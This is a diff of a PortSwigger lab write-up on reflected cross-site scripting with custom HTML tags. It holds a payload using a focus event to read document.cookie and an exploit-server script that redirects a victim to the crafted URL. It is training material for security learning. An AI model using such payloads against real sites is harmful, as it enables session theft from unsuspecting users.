@@ -1,5 +1,6 @@
 ---
-image: "img/Portswigger/xss.png"
+sidebar_position: 3
+image: "https://www.cloudflare.com/img/learning/security/threats/cross-site-scripting/xss-attack.png"
 ---
 
 --> Here most of the tags are blocked. only custom tags are allowed so we have to use payloads with custom tags
@@ -16,9 +17,9 @@ which was like this :
 %3Cxss+id%253dx+onfocus%253dalert(document.cookie)+tabindex%253d1%3E#x
 ```
 
---> Now goto `exploit server` and then add below code and then click `store` and then `send to victim`
+--> Now goto `exploit server` and now we will redirect the user to our payload and we can do this with [location](https://www.w3schools.com/js/js_window_location.asp) so let's use it but we have to write it between `<script>` tags to run js in our response.
 
-(idk why they used script and location to give the link to victim, i also found similar payload on hacktricks but it didn't worked :/ )
+==> So i made this payload:
 
 ```html
 <script>
@@ -26,3 +27,5 @@ which was like this :
     "https://your-lab-id.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x";
 </script>
 ```
+
+After that click `store` and then `send to victim`
